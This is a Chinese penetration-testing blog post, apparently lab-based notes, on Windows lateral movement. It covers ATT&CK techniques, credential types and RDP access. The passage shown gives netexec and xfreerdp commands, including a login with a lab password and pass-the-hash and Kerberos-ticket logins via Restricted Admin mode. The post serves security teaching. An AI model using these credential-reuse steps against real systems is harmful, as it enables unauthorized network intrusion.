@@ -1,0 +1,724 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Windows横向移动 | 小chen妙妙屋</title><meta name="author" content="chen7chen"><meta name="copyright" content="chen7chen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="简介横向移动是指在获得初始访问权限后，我们在网络中移动所使用的技术。通过了解横向移动，攻击者和防御者可以更好地导航和保护网络。这些知识使防御者能够实施更有效的安全措施，并帮助攻击者识别和利用网络防御中的弱点，最终实现更强大、更有韧性的安全态势。 横向移动涉及在网络内从一个系统移动到另一个系统，通常其目标是提升权限或访问敏感数据。利用横向移动技术，我们可以深入网络，寻找凭据、敏感数据和其他高价值资产">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows横向移动">
+<meta property="og:url" content="http://blog.xchstudy.org/2026/06/09/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/08%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1%20%E5%9F%9F%E6%B8%97%E9%80%8F/6%20Windows%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="小chen妙妙屋">
+<meta property="og:description" content="简介横向移动是指在获得初始访问权限后，我们在网络中移动所使用的技术。通过了解横向移动，攻击者和防御者可以更好地导航和保护网络。这些知识使防御者能够实施更有效的安全措施，并帮助攻击者识别和利用网络防御中的弱点，最终实现更强大、更有韧性的安全态势。 横向移动涉及在网络内从一个系统移动到另一个系统，通常其目标是提升权限或访问敏感数据。利用横向移动技术，我们可以深入网络，寻找凭据、敏感数据和其他高价值资产">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.chenjichao.site/raw/11.webp">
+<meta property="article:published_time" content="2026-06-09T03:45:28.618Z">
+<meta property="article:modified_time" content="2026-06-10T15:52:48.756Z">
+<meta property="article:author" content="chen7chen">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.chenjichao.site/raw/11.webp"><link rel="shortcut icon" href="/img/output.png"><link rel="canonical" href="http://blog.xchstudy.org/2026/06/09/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/08%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1%20%E5%9F%9F%E6%B8%97%E9%80%8F/6%20Windows%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Windows横向移动',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-10 23:52:48'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/music.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://unpkg.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="小chen妙妙屋" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="an_music_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/images.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">224</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">162</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fa-brands fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/#%E5%90%84%E4%BD%8D%E5%B8%88%E5%82%85"><i class="fa-fw fas fa-user-friends"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/link/#%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5"><i class="fa-fw fas fa-laptop-code"></i><span> 技术链接</span></a></li></ul></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://wiki.xchstudy.org/"><i class="fa-fw fas fa-book-open"></i><span> wiki</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-coffee"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.chenjichao.site/raw/11.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="小chen妙妙屋"><img class="site-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img%5Coutput.png"/><span class="site-name">小chen妙妙屋</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fa-brands fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/#%E5%90%84%E4%BD%8D%E5%B8%88%E5%82%85"><i class="fa-fw fas fa-user-friends"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/link/#%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5"><i class="fa-fw fas fa-laptop-code"></i><span> 技术链接</span></a></li></ul></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://wiki.xchstudy.org/"><i class="fa-fw fas fa-book-open"></i><span> wiki</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-coffee"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Windows横向移动</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-09T03:45:28.618Z" title="发表于 2026-06-09 11:45:28">2026-06-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-10T15:52:48.756Z" title="更新于 2026-06-10 23:52:48">2026-06-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span id="" data-flag-title="Windows横向移动"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>横向移动是指在获得初始访问权限后，我们在网络中移动所使用的技术。通过了解横向移动，攻击者和防御者可以更好地导航和保护网络。这些知识使防御者能够实施更有效的安全措施，并帮助攻击者识别和利用网络防御中的弱点，最终实现更强大、更有韧性的安全态势。</p>
+<p>横向移动涉及在网络内从一个系统移动到另一个系统，通常其目标是提升权限或访问敏感数据。利用横向移动技术，我们可以深入网络，寻找凭据、敏感数据和其他高价值资产。</p>
+<p>为了进行横向移动，我们需要任何形式 的凭据，包括密码、哈希、票据、SSH密钥和会话Cookie。我们可以利用这些凭证连接到远程计算机中，有效的横向移动需要对网络架构有深入的理解，并识别可用于在远程系统上执行代码的服务和协议</p>
+<h1 id="MITRE-ATT-amp-CK-框架"><a href="#MITRE-ATT-amp-CK-框架" class="headerlink" title="MITRE ATT&amp;CK 框架"></a>MITRE ATT&amp;CK 框架</h1><p>该 MITRE ATT&amp;CK 框架 将横向移动定义为用于进入和控制网络上远程系统的技术。这通常涉及探索网络、在多个系统和账户之间进行跳板攻击，以及使用远程访问工具或配合原生工具使用合法凭据。</p>
+<h2 id="技术介绍"><a href="#技术介绍" class="headerlink" title="技术介绍"></a>技术介绍</h2><p>MITRE ATT&amp;CK列出了几种横向移动技术，包括：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>技术ID</th>
+<th>Name</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1021</td>
+<td>远程服务</td>
+<td>利用 RDP、SMB 和 SSH 等合法的远程服务在网络中移动。</td>
+</tr>
+<tr>
+<td>T1021.001</td>
+<td>远程桌面协议（RDP）</td>
+<td>使用 RDP 与远程系统的桌面进行交互。</td>
+</tr>
+<tr>
+<td>T1021.002</td>
+<td>SMB/Windows 管理员共享</td>
+<td>利用 SMB 共享访问文件并执行命令。</td>
+</tr>
+<tr>
+<td>T1021.003</td>
+<td>分布式组件对象模型</td>
+<td>使用 DCOM 与远程系统上的软件组件进行交互。</td>
+</tr>
+<tr>
+<td>T1021.004</td>
+<td>SSH</td>
+<td>利用 SSH 安全地连接并控制远程系统。</td>
+</tr>
+<tr>
+<td>T1021.005</td>
+<td>VNC</td>
+<td>使用 VNC 远程控制系统。</td>
+</tr>
+<tr>
+<td>T1077</td>
+<td>Windows 管理共享</td>
+<td>利用管理共享进行横向移动。</td>
+</tr>
+<tr>
+<td>T1080</td>
+<td>污染共享内容</td>
+<td>修改共享内容以执行恶意代码。</td>
+</tr>
+<tr>
+<td>T1105</td>
+<td>入口工具传输</td>
+<td>将工具或文件传输到远程系统以供执行。</td>
+</tr>
+<tr>
+<td>T1210</td>
+<td>利用远程服务</td>
+<td>利用远程服务中的漏洞以获取访问权限。</td>
+</tr>
+<tr>
+<td>T1550</td>
+<td>使用备用身份验证凭据</td>
+<td>使用窃取的令牌、密钥或证书进行身份验证。</td>
+</tr>
+<tr>
+<td>T1563</td>
+<td>远程服务会话劫持</td>
+<td>劫持合法的远程服务会话。</td>
+</tr>
+<tr>
+<td>T1563.001</td>
+<td>SSH 劫持</td>
+<td>劫持 SSH 会话。</td>
+</tr>
+<tr>
+<td>T1569</td>
+<td>系统服务</td>
+<td>利用系统服务执行命令或进行横向移动。</td>
+</tr>
+<tr>
+<td>T1569.001</td>
+<td>Launchctl</td>
+<td>使用 launchctl 命令管理 macOS 上的启动服务。</td>
+</tr>
+<tr>
+<td>T1569.002</td>
+<td>服务执行</td>
+<td>使用系统服务执行命令或脚本。</td>
+</tr>
+<tr>
+<td>T1570</td>
+<td>横向工具传输</td>
+<td>在网络内部将工具从一个系统移动到另一个系统。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>这些技术说明了我们可以用来网络中导航和控制远程系统的各种方法</p>
+<h1 id="直接横向移动"><a href="#直接横向移动" class="headerlink" title="直接横向移动"></a>直接横向移动</h1><p>直接横向移动是指我们可以在目标机器上直接执行命令，并强制目标机器连接回我们。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imagebot.chenjichao.site/file/1781083055833_image.png" alt="image.png"></p>
+<h1 id="间接横向移动"><a href="#间接横向移动" class="headerlink" title="间接横向移动"></a>间接横向移动</h1><p>涉及在目标系统接受来自另一系统的指令时，在其上执行命令。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imagebot.chenjichao.site/file/1781083223059_image.png" alt="image.png"></p>
+<h1 id="远程服务简介"><a href="#远程服务简介" class="headerlink" title="远程服务简介"></a>远程服务简介</h1><p>远程服务是企业和IT部门必不可少的工具，能够实现系统的远程访问与管理，促进协作并提高效率。这些服务允许管理员在无需物理接触的情况下对系统进行管理和故障排除，这在分布式和大规模环境中尤为重要</p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><ul>
+<li><strong>Remote Desktop Protocol (RDP)</strong>：<strong>RDP</strong> 是由微软开发的一种专有协议，为用户提供图形界面，以便通过网络连接到另一台计算机。它被广泛用于远程管理和技术支持。</li>
+<li><strong>SMB / Windows Shares</strong>：<strong>服务器消息块（SMB）</strong> 是一种网络文件共享协议，允许应用程序和用户对文件进行读写，并向网络中的服务器程序请求服务。Windows 共享使用 SMB 来实现机器之间的文件和打印机共享。</li>
+<li><strong>Windows Management Instrumentation (WMI)</strong>：<strong>WMI</strong> 是微软的一套规范，用于统一管理 Windows 计算系统网络中的设备和应用程序。它为远程管理和数据采集提供了强大的功能。</li>
+<li><strong>Windows Remote Management (WinRM)</strong>：<strong>WinRM</strong> 是 Microsoft 对 WS-Management 协议的实现，它提供了一种使用 Web 服务与本地和远程计算机进行通信的安全方式。它通常用于远程管理任务。</li>
+<li><strong>Distributed Component Object Model (DCOM)</strong>：<strong>DCOM</strong> 是一项 Microsoft 技术，允许软件组件通过网络直接进行通信。它扩展了组件对象模型（COM），以支持不同计算机上的对象之间的通信。</li>
+<li><strong>Secure Shell (SSH)</strong>：<strong>SSH</strong> 是一种加密网络协议，用于在不安全网络上安全地运行网络服务。它被广泛用于远程命令行登录和远程命令执行。</li>
+</ul>
+<h2 id="枚举方法"><a href="#枚举方法" class="headerlink" title="枚举方法"></a>枚举方法</h2><p>为了利用这些远程服务，我们首先需要在网络中识别它们。枚举涉及发现可用服务并收集有关它们的信息。常见的枚举方法包括：</p>
+<ul>
+<li><strong>Port scanning</strong>：识别开放端口及其运行的服务。</li>
+<li><strong>Service banners</strong>：捕获并分析服务横幅，以收集版本和配置信息。</li>
+<li><strong>Active Directory</strong>：查询 Active Directory 以检索有关系统及其服务的信息。</li>
+</ul>
+<p>利用已获取的凭据，我们可以对这些服务进行身份验证并尝试横向移动。我们可能使用的不同类型的凭据包括：</p>
+<ul>
+<li><strong>Passwords</strong>：传统的身份验证形式，用户提供一个秘密单词或短语来验证其身份。</li>
+<li><strong>NTLM Hashes</strong>：Windows 环境中用于身份验证的密码加密表示形式。我们可以通过名为“哈希传递（Pass the Hash）”的技术，使用这些哈希值进行身份验证，而无需实际密码。</li>
+<li><strong>NTLMv2 Hashes</strong>：NTLM 哈希的改进版本，提供了更好的安全性。这些哈希也用于 Windows 环境中的身份验证。我们可以利用 NTLM 重放攻击（NTLM Relay attacks）在网络中滥用这些哈希进行横向移动。</li>
+<li><strong>AES256 Keys</strong>：高级加密标准（AES），使用 256 位密钥进行数据加密。在某些情况下，这些密钥可用于在 Windows 系统上通过 Rubeus 或 Mimikatz 进行身份验证。</li>
+<li><strong>Tickets (Kerberos)</strong>：Kerberos 是一种身份验证协议，它使用票据允许节点安全地证明其身份。我们可以伪造或捕获票据，并利用它们进行身份验证，从而在网络内进行横向移动。</li>
+</ul>
+<h1 id="远程桌面服务（RDP）"><a href="#远程桌面服务（RDP）" class="headerlink" title="远程桌面服务（RDP）"></a>远程桌面服务（RDP）</h1><p>是微软开发的一种专有协议，为用户提供图形化界面，以便通过网络连接至另一台计算机</p>
+<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>连接RDP所需的权限取决于具体配置；默认情况下，只有<code>Administrators</code>或远程连接用户组的成员可以通过RDP连接。此外，管理员可以通过RDP连接。此外，管理员可以授予特定用户或者组连接RDP的权限。由于这些权限是在本地设置的，枚举它们的唯一方法是我们拥有目标计算机的权限</p>
+<h2 id="RDP枚举"><a href="#RDP枚举" class="headerlink" title="RDP枚举"></a>RDP枚举</h2><p>要利用RDP进行横向移动，我们需要了解正在测试的环境是否存在RDP，weighing可以使用nmap或者任何其他网络枚举工具来搜索3389端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec rdp &lt;IP&gt; -u &lt;用户名&gt; -P &#x27;&lt;密码&gt;&#x27; -d 域名</span><br></pre></td></tr></table></figure>
+<h3 id="针对低延迟网络或代理连接优化-xfreerdp"><a href="#针对低延迟网络或代理连接优化-xfreerdp" class="headerlink" title="针对低延迟网络或代理连接优化 xfreerdp"></a>针对低延迟网络或代理连接优化 xfreerdp</h3><p>如果您通过代理或在网络连接较慢的情况下使用 <strong>xfreerdp</strong>，我们可以通过使用以下附加选项来提高会话速度：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:Helen /p:&#x27;RedRiot88&#x27; /d:inlanefreight.local /v:10.129.229.244</span><br><span class="line">/dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper</span><br><span class="line">/clipboard /audio-mode:0 /auto-reconnect -glyph-cache</span><br></pre></td></tr></table></figure><br>在该命令中：</p>
+<ul>
+<li><strong>/bpp:8</strong>：将色深降低至每像素 8 位，从而减少传输的数据量。</li>
+<li><strong>/compression</strong>：启用压缩以减少通过网络发送的数据量。</li>
+<li><strong>-themes</strong>：禁用桌面主题以减少图形数据。</li>
+<li><strong>-wallpaper</strong>：禁用桌面壁纸以进一步减少图形数据。</li>
+<li><strong>/clipboard</strong>：启用本地计算机与远程计算机之间的剪贴板共享。</li>
+<li><strong>/audio-mode:0</strong>：禁用音频重定向以节省带宽。</li>
+<li><strong>/auto-reconnect</strong>：如果连接中断则自动重新连接，从而提高会话稳定性。</li>
+<li><strong>-glyph-cache</strong>：启用字形（文本字符）缓存，以减少文本渲染时发送的数据量。</li>
+</ul>
+<h2 id="受限管理模式"><a href="#受限管理模式" class="headerlink" title="受限管理模式"></a>受限管理模式</h2><p><strong>远程登录目标主机时，不把明文密码、可复用凭据、Kerberos TGT 等凭据缓存到目标机器的 LSASS 中。</strong></p>
+<p>它主要是为了防止管理员登录到一台已经被攻陷的机器后，自己的凭据被攻击者从 LSASS 中抓取。</p>
+<p>普通 RDP 登录时，目标机通常会获得可用于创建登录会话的凭据材料，因此如果目标机已经被控，管理员凭据可能被抓取。</p>
+<p>受限管理模式下，RDP 不会把完整凭据交给远程主机，因此目标机上通常不会留下明文密码、可复用凭据或 Kerberos TGT。</p>
+<hr>
+<h3 id="普通-RDP-与受限管理模式-RDP"><a href="#普通-RDP-与受限管理模式-RDP" class="headerlink" title="普通 RDP 与受限管理模式 RDP"></a>普通 RDP 与受限管理模式 RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">普通 RDP：    通常需要明文密码登录。受限管理模式 RDP：    可以利用 NTLM Hash 或 Kerberos 票据完成认证，    不把完整凭据交给目标机。</span><br></pre></td></tr></table></figure>
+<p>常见利用方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.10.23 /u:administrator /d:corp.local /pth:&lt;NTLM_HASH&gt; /restricted-admin /cert:ignore</span><br></pre></td></tr></table></figure>
+<p>或者使用 Kerberos 票据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=/tmp/admin.ccachexfreerdp /v:ws01.corp.local /u:administrator /d:corp.local /restricted-admin /cert:ignore</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="如何查看目标机是否开启受限管理模式？"><a href="#如何查看目标机是否开启受限管理模式？" class="headerlink" title="如何查看目标机是否开启受限管理模式？"></a>如何查看目标机是否开启受限管理模式？</h3><h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><p>最准确的方法是查注册表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin</span><br></pre></td></tr></table></figure>
